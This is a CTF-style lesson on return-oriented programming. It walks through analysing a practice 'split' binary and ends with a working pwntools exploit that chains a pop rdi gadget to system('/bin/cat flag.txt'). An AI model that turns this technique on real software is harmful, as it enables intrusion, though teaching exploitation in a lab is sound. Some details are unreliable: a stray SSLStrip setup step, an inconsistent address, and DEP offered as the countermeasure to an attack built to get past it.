---
title: "Introduction to ROP Attack"
teaching: 10
exercises: 30
questions:
- "What is ROP Attack?"
- "How to build the payload?"
- "What can users do to prevent ROP from happening"
objectives:
- "Successfully conduct a ROP Attack."
keypoints:
- "User needs to know the vulnerability of the ELF file provided and know how to build the payload"
---

## ROP Attack

- ROP stands for "Return-Oriented Programming" and is a type of attack that allows an attacker to take control of a program's execution flow by manipulating its stack.

- ROP attacks work by finding "gadgets" in the program's code, which are short sequences of instructions that end with a "return" instruction. By chaining these gadgets together, the attacker can construct a new program flow that achieves their desired outcome.

- ROP attacks are often used to bypass security measures like DEP (Data Execution Prevention) and ASLR (Address Space Layout Randomization), which are designed to prevent traditional buffer overflow attacks.

- ROP attacks can be difficult to defend against, as they don't rely on injecting code into the program's memory like traditional attacks do. Instead, they rely on using the program's own code against itself.


### Demonstration

The demonstration on CHEESEHub illustrates the ROP attack using one machines; 
1. We will  analyze the ELF File provided to know what's the vunerabilities of the program 
2. We will build the payload based on that. We verify the success of the attack by printing the flag.txt.

> ## prerequisites
> 
> You will need to conduct the Buffer Overflow attack prior to the ROP attack. If you're not familiar with it, you could refer to [Lesson: Introduction to Buffer Overflow Attack](https://github.com/cheese-hub/BufferOverflowAttack)
> You will need to know the knowledge of [Assembly Language](https://github.com/cheese-hub/ROP-Attack/blob/main/assembly%20language.md), [pwntools](https://github.com/cheese-hub/ROP-Attack/blob/main/pwntools.md), and [Radare2](https://github.com/cheese-hub/ROP-Attack/blob/main/r2.md) prior to the ROP Attack.
{: .prereq} 

> ## Getting Started
> 
> You will need to create an account on [CHEESEHub](https://www.hub.cheesehub.org) to work through this exercise.
> Each container in this demonstration has a web interface and is accessible through your web browser, no other special software 
> is needed.
{: .callout} 

We will start by first adding the SSLStrip application:

![Add SSLStrip]({{ page.root }}/fig/sslstrip/add-sslstrip.png)

Next, click the *View* link to go to the application-specific page and start the application containers:

![Start Containers]({{ page.root }}/fig/sslstrip/start-containers.png)

> ## Container Launch Errors
>
> If a container fails to start, you will see a flashing warning icon next to the container's name. Take a look at the logs to 
> determine the cause of failure and try deleting the application and restarting.
{: .callout}

Once all the containers have started, launch each container's web interface in a separate browser tab by clicking the icon 
next to the container's name.
## Let's get start it



## Analyze the ELF File
Here is the figure of r2 -AAAA split
![image](https://user-images.githubusercontent.com/77866826/236359081-8598cb0f-7cbf-4f48-88f9-13d4d418f775.png)

![image](https://user-images.githubusercontent.com/77866826/236639440-7c8506b2-1c5e-4a64-9f3a-6a24a7a32ca5.png)
Check the program's protections and find that NX is enabled.

## Find the vulnerabilities
using afl to list all the functions involved
![image](https://user-images.githubusercontent.com/77866826/236639496-5dfd204f-2e61-4b17-9268-729301bd083b.png)

After analyzing with r2, the main, pwnme, and usefulFunction functions were discovered.

![image](https://user-images.githubusercontent.com/77866826/236639532-2ac5cb20-5cac-4feb-b1d7-d53b9011bcf4.png)


3 figures of find functions
![image](https://user-images.githubusercontent.com/77866826/236639632-f297cf2f-d445-48f2-879e-0d8fd0bac1cb.png)

![image](https://user-images.githubusercontent.com/77866826/236639683-910e5cdc-e398-46dc-8965-84252d37e55d.png)

We can see in the pwnme function that there is a buffer with the size of 32 bytes but fgets allow to unput 96 bytes
So an overflow will happen and we can use as the start of the payload.
## Find the bytes needed to make an overflow
First we use gdb to analyse
![image](https://user-images.githubusercontent.com/77866826/236639994-7464498b-9e4d-41dd-934f-cd8d79f9c1c3.png)
And then we generate a random 100 bytes string as input
![image](https://user-images.githubusercontent.com/77866826/236640121-3db8cc3e-4a03-42bd-83a4-61fce5f4bb84.png)
![image](https://user-images.githubusercontent.com/77866826/236640208-bfcb716f-9e54-4283-a469-91a4f6a2d826.png)

And then we do pattern-search
![image](https://user-images.githubusercontent.com/77866826/236640243-48ba12fe-dcb0-493b-a5a2-1320aad20cc9.png)

We can tell in order to overflowrsp we need 40 bytes

## Back to usefulFunction to keep using r2.
![image](https://user-images.githubusercontent.com/77866826/236640293-c1c893e6-93a1-431f-9128-7613b5be80e1.png)

We can see that the usefulFunction is gonna to call system function with string '/bin/ls' as its parameter
After we run the program, we can see that '/bin/ls' is used.
But our goal is to use  '/bin/cat flag.txt' as its parameter so that we can print the flag. So keep searching the gadgets we want.



## Let's get back to r2 and use izz to list the string inside the ELF File.
![image](https://user-images.githubusercontent.com/77866826/236640330-8114d260-e81e-4237-a786-336c098c549d.png)
![image](https://user-images.githubusercontent.com/77866826/236640342-c90de3aa-5feb-4997-84b2-bde8b9276137.png)

We can see that there is a string that can print the flag:/bin/cat flag.txt


And the address of this string is 0x0001060.

## The idea came out!
Now we try to make an overflow and return to the address of system function after that and try to exec the system function with the parameter /bin/cat flag.txt. 
In order to do that,we need to pass the address of the string to RDI Register. We need ROPgadget to help us implement this because it can find related string in the file
![image](https://user-images.githubusercontent.com/77866826/236640364-d56ae265-a276-4263-acee-92b72fae5cab.png)
![image](https://user-images.githubusercontent.com/77866826/236640501-3212fd1c-7e32-418c-b21d-15bb39fac710.png)
We can use" pop rdi : ret "to do make it as a gadget.
## Build and Analyze the code
from pwn import *

# create a process object and load the executable binary
p = process('./split')



# determine the offset to the return address on the stack
offset = 40

# retrieve the addresses of the desired functions/strings using the ELF object
ret_address = 0x00000000004007c3


# construct the payload by padding the offset with arbitrary characters
# then appending the address of the return instruction and the address of the system call with the argument of the flag file
payload = b'A' * offset + p64(ret_address) + p64(0x00601060) + p64(0x0040074b)

# send the payload to the process and get the result
p.sendline(payload)
p.interactive()


## Catch the Flag!!
## Contermeasure?

> ## ROP Split Attack
> 
> We can use DEP as the countermeasure. Data Execution Prevention (DEP): DEP is a security feature that prevents the execution of code from memory pages that are marked as data. This can help prevent attackers from executing malicious code in the first place.

{% include links.md %}

